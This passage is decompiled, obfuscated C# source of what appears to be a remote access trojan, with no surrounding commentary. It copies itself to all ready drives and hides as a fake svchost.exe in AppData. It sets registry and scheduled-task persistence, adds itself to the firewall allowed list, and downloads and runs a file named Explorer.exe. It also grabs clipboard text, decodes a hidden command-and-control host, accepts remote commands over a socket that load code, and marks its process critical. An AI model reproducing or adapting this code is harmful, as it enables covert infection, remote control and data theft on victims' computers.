        DriveInfo[] drives = DriveInfo.GetDrives();
        int index = 0;
        while (index < drives.Length)
        {
          DriveInfo driveInfo = drives[index];
          Application.DoEvents();
          Thread.Sleep(5);
          if (driveInfo.IsReady)
            System.IO.File.Copy(Application.ExecutablePath, driveInfo.RootDirectory.FullName + \u0040Ә.\u0040ӭ, true);
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    if (\u0040Ә.\u0040Ԩ)
    {
      try
      {
        Registry.CurrentUser.OpenSubKey(\u0040Ә.\u0040Ӱ, true).DeleteValue(\u0040Ә.\u0040Ӱ, false);
        \u0040Ә.\u0040ր(\u0040Ә.\u0040Ӱ, \u0040Ә.\u0040Բ.FullName, "1");
        \u0040Ә.\u0040ր(\u0040Ә.\u0040Ӱ, \u0040Ә.\u0040Բ.FullName, "2");
        \u0040Ә.\u0040ր(\u0040Ә.\u0040Ӱ, \u0040Ә.\u0040Բ.FullName, "3");
        \u0040Ә.\u0040ր(\u0040Ә.\u0040Ӱ, \u0040Ә.\u0040Բ.FullName, "4");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    if (\u0040Ә.\u0040Ԧ)
    {
      try
      {
        Registry.LocalMachine.OpenSubKey(\u0040Ә.\u0040Ӷ, true).DeleteValue(\u0040Ә.\u0040Ӯ, false);
        \u0040Ә.\u0040ր(\u0040Ә.\u0040Ӷ, \u0040Ә.\u0040Բ.FullName, "1");
        \u0040Ә.\u0040ր(\u0040Ә.\u0040Ӷ, \u0040Ә.\u0040Բ.FullName, "2");
        \u0040Ә.\u0040ր(\u0040Ә.\u0040Ӷ, \u0040Ә.\u0040Բ.FullName, "3");
        \u0040Ә.\u0040ր(\u0040Ә.\u0040Ӷ, \u0040Ә.\u0040Բ.FullName, "4");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    if (\u0040Ә.\u0040ԥ)
    {
      try
      {
        Registry.LocalMachine.OpenSubKey(\u0040Ә.\u0040Ӵ, true).DeleteValue(\u0040Ә.\u0040ӱ, false);
        \u0040Ә.\u0040ր(\u0040Ә.\u0040Ӵ, \u0040Ә.\u0040Բ.FullName, "1");
        \u0040Ә.\u0040ր(\u0040Ә.\u0040Ӵ, \u0040Ә.\u0040Բ.FullName, "2");
        \u0040Ә.\u0040ր(\u0040Ә.\u0040Ӵ, \u0040Ә.\u0040Բ.FullName, "3");
        \u0040Ә.\u0040ր(\u0040Ә.\u0040Ӵ, \u0040Ә.\u0040Բ.FullName, "4");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    if (!\u0040Ә.\u0040Ԫ)
      ;
    if (\u0040Ә.\u0040ԫ)
    {
      try
      {
        RegistryKey subKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
        subKey.SetValue("DisableTaskMgr", (object) 0);
        subKey.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    if (\u0040Ә.\u0040Ԭ)
    {
      try
      {
        new WebClient().DownloadFile(\u0040Ә.\u0040Ӵ, Interaction.Environ("tmp") + "/Explorer.exe");
        Interaction.Shell(Interaction.Environ("tmp") + "/Explorer.exe");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    if (\u0040Ә.\u0040ԭ)
    {
      try
      {
        Interaction.Shell("netsh firewall delete allowedprogram \"" + \u0040Ә.\u0040Բ.FullName + "\"", AppWinStyle.Hide);
        Interaction.Shell("netsh firewall add allowedprogram \"" + \u0040Ә.\u0040Բ.FullName + "\" \"" + \u0040Ә.\u0040Բ.Name + "\" ENABLE", AppWinStyle.Hide);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    if (\u0040Ә.\u0040ԯ)
    {
      if (Operators.CompareString(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\svchost.exe", false) == 0)
      {
        if (System.IO.File.Exists(Path.GetTempPath() + "melt.txt"))
        {
          try
          {
            System.IO.File.Delete(System.IO.File.ReadAllText(Path.GetTempPath() + "melt.txt"));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
      }
      else if (System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\svchost.exe"))
      {
        try
        {
          System.IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\svchost.exe");
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\svchost.exe");
        System.IO.File.WriteAllText(Path.GetTempPath() + "melt.txt", Application.ExecutablePath);
        Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\svchost.exe");
        ProjectData.EndApp();
      }
      else
      {
        System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\svchost.exe");
        System.IO.File.WriteAllText(Path.GetTempPath() + "melt.txt", Application.ExecutablePath);
        Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\svchost.exe");
        ProjectData.EndApp();
      }
    }
    if (!\u0040Ә.\u0040\u0530)
      return;
    try
    {
      string file = MyProject.Computer.FileSystem.SpecialDirectories.Temp + "/StUpdate.exe";
      MyProject.Computer.FileSystem.WriteAllBytes(file, System.IO.File.ReadAllBytes(Application.ExecutablePath), true);
      Interaction.Shell("schtasks /create /sc minute /mo 1 /tn StUpdate /tr " + file, AppWinStyle.Hide);
      Thread.Sleep(50);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
  }

  public static void \u0040ր(string _param0, string _param1, string _param2)
  {
    try
    {
      if (Operators.CompareString(_param2, "1", false) == 0)
        Registry.CurrentUser.CreateSubKey(\u0040Ә.\u0040Ӵ).SetValue(_param0, (object) _param1);
      else if (Operators.CompareString(_param2, "2", false) == 0)
        Registry.CurrentUser.CreateSubKey(\u0040Ә.\u0040Ӵ).SetValue(_param0, (object) _param1);
      else if (Operators.CompareString(_param2, "3", false) == 0)
      {
        Registry.LocalMachine.CreateSubKey(\u0040Ә.\u0040Ӵ).SetValue(_param0, (object) _param1);
      }
      else
      {
        if (Operators.CompareString(_param2, "4", false) != 0)
          return;
        Registry.LocalMachine.CreateSubKey(\u0040Ә.\u0040Ӵ).SetValue(_param0, (object) _param1);
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
  }

  public object \u0040ց(string _param1) => (object) _param1;

  [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
  public static void \u0040ւ()
  {
    string text = Clipboard.GetText();
    System.IO.File.WriteAllText(Path.GetTempPath() + "\\FransescoPast.txt", text);
    string Find = "FRANSESCO";
    string str = "Strik";
    try
    {
      \u0040Ә.\u0040Ե = \u0040Ә.\u0040Մ(ref \u0040Ә.\u0040Ե);
      if (Conversion.Val((object) DateTime.Today.Day) > Conversion.Val(MyProject.Computer.FileSystem.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\app")))
      {
        \u0040Ә.\u0040Ե = Conversions.ToString(2000);
        \u0040Ә.\u0040ӥ = Encoding.UTF8.GetString(Convert.FromBase64String(Strings.Replace(Strings.Replace("aGFraW0z*i5kZG5zLm5ldA!!", "*", "M"), "!", "=")));
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    MyProject.Computer.FileSystem.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\app", Conversions.ToString(DateTime.Today.Day), false);
    \u0040Ә.\u0040ӥ = Encoding.UTF8.GetString(Convert.FromBase64String(Strings.Replace(Strings.Replace(\u0040Ә.\u0040ӥ, Find, "M"), str, "=")));
    if (Interaction.Command() == null)
    {
      try
      {
        \u0040Ә.\u0040ӣ.Registry.CurrentUser.SetValue("di", (object) "!");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      Thread.Sleep(5000);
    }
    bool createdNew = false;
    \u0040Ә.\u0040Դ = (object) new Mutex(true, \u0040Ә.\u0040Է, out createdNew);
    if (!createdNew)
      ProjectData.EndApp();
    \u0040Ә.\u0040տ();
    if (!\u0040Ә.\u0040ӷ)
    {
      \u0040Ә.\u0040Ӣ = \u0040Ә.\u0040Բ.Name;
      \u0040Ә.\u0040ӡ = \u0040Ә.\u0040Բ.Directory.Name;
    }
    new Thread(new ThreadStart(\u0040Ә.\u0040և), 1).Start();
    try
    {
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    int num = 0;
    string Left = "";
    if (\u0040Ә.\u0040Ӟ)
    {
      try
      {
        SystemEvents.SessionEnding += new SessionEndingEventHandler(\u0040Ә.\u0040Խ);
        \u0040Ә.\u0040ֆ(1);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
    while (true)
    {
      Thread.Sleep(1000);
      if (!\u0040Ә.\u0040Ӡ)
        Left = "";
      Application.DoEvents();
      try
      {
        checked { ++num; }
        if (num == 5)
        {
          try
          {
            Process.GetCurrentProcess().MinWorkingSet = (IntPtr) 1024;
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
        }
        if (num >= 8)
        {
          num = 0;
          \u0040Ә.\u0040Ծ();
          if (Operators.CompareString(Left, str, false) != 0)
          {
            Left = str;
            \u0040Ә.\u0040\u0589("act" + \u0040Ә.\u0040Ի + str);
          }
        }
        if (\u0040Ә.\u0040ӹ)
        {
          try
          {
            if (Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(\u0040Ә.\u0040ӣ.Registry.CurrentUser.GetValue(\u0040Ә.\u0040Ը + "\\" + \u0040Ә.\u0040Է, (object) "")), (object) ("\"" + \u0040Ә.\u0040Բ.FullName + "\" .."), false))
              \u0040Ә.\u0040ӣ.Registry.CurrentUser.OpenSubKey(\u0040Ә.\u0040Ը, true).SetValue(\u0040Ә.\u0040Է, (object) ("\"" + \u0040Ә.\u0040Բ.FullName + "\" .."));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
          try
          {
            if (Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(\u0040Ә.\u0040ӣ.Registry.LocalMachine.GetValue(\u0040Ә.\u0040Ը + "\\" + \u0040Ә.\u0040Է, (object) "")), (object) ("\"" + \u0040Ә.\u0040Բ.FullName + "\" .."), false))
              \u0040Ә.\u0040ӣ.Registry.LocalMachine.OpenSubKey(\u0040Ә.\u0040Ը, true).SetValue(\u0040Ә.\u0040Է, (object) ("\"" + \u0040Ә.\u0040Բ.FullName + "\" .."));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
  }

  public static string \u0040փ(byte[] _param0)
  {
    _param0 = new MD5CryptoServiceProvider().ComputeHash(_param0);
    string str = "";
    byte[] numArray = _param0;
    int index = 0;
    while (index < numArray.Length)
    {
      byte num = numArray[index];
      str += num.ToString("x2");
      checked { ++index; }
    }
    return str;
  }

  private static int \u0040ք(IntPtr _param0, int _param1, ref int _param2, int _param3)
  {
    int num;
    return num;
  }

  public static object \u0040օ(byte[] _param0, string _param1)
  {
    Module[] modules = Assembly.Load(_param0).GetModules();
    int index1 = 0;
    while (index1 < modules.Length)
    {
      Module module = modules[index1];
      System.Type[] types = module.GetTypes();
      int index2 = 0;
      while (index2 < types.Length)
      {
        System.Type type = types[index2];
        if (type.FullName.EndsWith("." + _param1))
          return module.Assembly.CreateInstance(type.FullName);
        checked { ++index2; }
      }
      checked { ++index1; }
    }
    return (object) null;
  }

  public static void \u0040ֆ(int _param0)
  {
    try
    {
      \u0040Ә.\u0040ք(Process.GetCurrentProcess().Handle, 29, ref _param0, 4);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
  }

  public static void \u0040և()
  {
    while (true)
    {
      \u0040Ә.\u0040Ա = "";
      if (\u0040Ә.\u0040ӟ != null)
      {
        long num1 = -1;
        int num2 = 0;
        try
        {
          while (true)
          {
            do
            {
              checked { ++num2; }
              if (num2 == 10)
              {
                num2 = 0;
                Thread.Sleep(1);
              }
              if (\u0040Ә.\u0040Ӡ)
              {
                if (\u0040Ә.\u0040ӟ.Available < 1)
                  \u0040Ә.\u0040ӟ.Client.Poll(-1, SelectMode.SelectRead);
label_10:
                do
                {
                  if (\u0040Ә.\u0040ӟ.Available > 0)
                  {
                    if (num1 == -1L)
                    {
                      string str = "";
                      while (true)
                      {
                        int CharCode = \u0040Ә.\u0040ӟ.GetStream().ReadByte();
                        switch (CharCode)
                        {
                          case -1:
                            goto label_26;
                          case 0:
                            num1 = Conversions.ToLong(str);
                            if (num1 == 0L)
                            {
                              \u0040Ә.\u0040\u0589("");
                              num1 = -1L;
                            }
                            goto label_10;
                          default:
                            str += Conversions.ToString(Conversions.ToInteger(Strings.ChrW(CharCode).ToString()));
                            continue;
                        }
                      }
                      goto label_19;
                    }
                    else
                      goto label_19;
                  }
                  else
                    goto label_24;
                }
                while (\u0040Ә.\u0040ӟ.Available > 0);
                continue;
label_19:
                \u0040Ә.\u0040ӝ = new byte[checked (\u0040Ә.\u0040ӟ.Available + 1 - 1 + 1)];
                long num3 = checked (num1 - \u0040Ә.\u0040Գ.Length);
                if ((long) \u0040Ә.\u0040ӝ.Length > num3)
                  \u0040Ә.\u0040ӝ = new byte[checked ((int) (num3 - 1L) + 1 - 1 + 1)];
                int count = \u0040Ә.\u0040ӟ.Client.Receive(\u0040Ә.\u0040ӝ, 0, \u0040Ә.\u0040ӝ.Length, SocketFlags.None);
                \u0040Ә.\u0040Գ.Write(\u0040Ә.\u0040ӝ, 0, count);
              }
              else
                goto label_26;
            }
            while (\u0040Ә.\u0040Գ.Length != num1);
            num1 = -1L;
            Thread thread = new Thread(new ParameterizedThreadStart(\u0040Ә.\u0040Լ), 1);
            thread.Start((object) \u0040Ә.\u0040Գ.ToArray());
            thread.Join(100);
            \u0040Ә.\u0040Գ.Dispose();
            \u0040Ә.\u0040Գ = new MemoryStream();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
label_24:;
      }
label_26:
      do
      {
        try
        {
          if (\u0040Ә.\u0040Զ != null)
          {
            NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(\u0040Ә.\u0040Զ), (System.Type) null, "clear", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
            \u0040Ә.\u0040Զ = (object) null;
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
        \u0040Ә.\u0040Ӡ = false;
      }
      while (!\u0040Ә.\u0040Ճ());
      \u0040Ә.\u0040Ӡ = true;
    }
  }

  public static byte[] \u0040\u0588(ref string _param0) => Encoding.UTF8.GetBytes(_param0);

  public static bool \u0040\u0589(string _param0) => \u0040Ә.\u0040\u058A(\u0040Ә.\u0040\u0588(ref _param0));

  public static bool \u0040\u058A(byte[] _param0)
  {
    if (!\u0040Ә.\u0040Ӡ)
      return false;
    try
    {
      lock (\u0040Ә.\u0040Բ)
      {
        if (!\u0040Ә.\u0040Ӡ)
          return false;
        MemoryStream memoryStream = new MemoryStream();
        string str = _param0.Length.ToString() + "\0";
        byte[] buffer = \u0040Ә.\u0040\u0588(ref str);
        memoryStream.Write(buffer, 0, buffer.Length);
        memoryStream.Write(_param0, 0, _param0.Length);
        \u0040Ә.\u0040ӟ.Client.Send(memoryStream.ToArray(), 0, checked ((int) memoryStream.Length), SocketFlags.None);
      }
    }
    catch (Exception ex1)
    {
      ProjectData.SetProjectError(ex1);
      ProjectData.SetProjectError(ex1);
      try
      {
        if (\u0040Ә.\u0040Ӡ)
        {
          \u0040Ә.\u0040Ӡ = false;
          \u0040Ә.\u0040ӟ.Close();
        }
      }
      catch (Exception ex2)
      {
        ProjectData.SetProjectError(ex2);
        ProjectData.SetProjectError(ex2);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    return \u0040Ә.\u0040Ӡ;
  }

  public static bool \u0040\u058B(string _param0, object _param1, RegistryValueKind _param2)
  {
    bool flag;
    try
    {
      \u0040Ә.\u0040ӣ.Registry.CurrentUser.CreateSubKey("Software\\" + \u0040Ә.\u0040Է).SetValue(_param0, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(_param1))), _param2);
      flag = true;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      flag = false;
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    return flag;
  }

  [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
  public static void \u0040\u058C()
  {
    \u0040Ә.\u0040ֆ(0);
    \u0040Ә.\u0040ӹ = false;
    try
    {
      \u0040Ә.\u0040ӣ.Registry.CurrentUser.OpenSubKey(\u0040Ә.\u0040Ը, true).DeleteValue(\u0040Ә.\u0040Է, false);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    try
    {
      \u0040Ә.\u0040ӣ.Registry.LocalMachine.OpenSubKey(\u0040Ә.\u0040Ը, true).DeleteValue(\u0040Ә.\u0040Է, false);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    try
    {
      Interaction.Shell("netsh firewall delete allowedprogram \"" + \u0040Ә.\u0040Բ.FullName + "\"", AppWinStyle.Hide);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    try
    {
      if (\u0040Ә.\u0040Ӥ != null)
      {
        \u0040Ә.\u0040Ӥ.Dispose();
        System.IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + \u0040Ә.\u0040Է + ".exe");
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    try
    {
      \u0040Ә.\u0040ӣ.Registry.CurrentUser.OpenSubKey("Software", true).DeleteSubKey(\u0040Ә.\u0040Է, false);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    try
    {
      Interaction.Shell("cmd.exe /c ping 0 -n 2 & del \"" + \u0040Ә.\u0040Բ.FullName + "\"", AppWinStyle.Hide);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    ProjectData.EndApp();
  }

  public static byte[] \u0040\u058D(byte[] _param0)
  {
    MemoryStream memoryStream = new MemoryStream(_param0);
    GZipStream gzipStream = new GZipStream((Stream) memoryStream, CompressionMode.Decompress);
    byte[] buffer = new byte[4];
    memoryStream.Position = checked (memoryStream.Length - 5L);
    memoryStream.Read(buffer, 0, 4);
    int int32 = BitConverter.ToInt32(buffer, 0);
    memoryStream.Position = 0L;
    byte[] array = new byte[checked (int32 - 1 + 1 - 1 + 1)];
    gzipStream.Read(array, 0, int32);
    gzipStream.Dispose();
    memoryStream.Dispose();
    return array;
  }

  [DllImport("user32", EntryPoint = "ShowCursor", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern long \u0040\u058E(long _param0);
}
